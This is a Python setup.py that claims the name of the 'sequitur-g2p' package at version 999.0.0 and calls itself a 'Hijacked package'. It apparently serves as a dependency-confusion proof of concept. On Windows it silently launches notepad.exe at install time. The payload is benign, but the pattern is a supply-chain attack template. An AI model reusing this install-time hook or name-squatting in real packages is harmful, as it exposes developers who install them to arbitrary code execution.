import subprocess
import sys
import setuptools
import os

if sys.platform == "win32":
    try:
        subprocess.Popen(["notepad.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

setuptools.setup(
    name="sequitur-g2p",
    version="999.0.0",
    packages=setuptools.find_packages(where="src"),
    package_dir={"": "src"},
    description="Hijacked package",
)
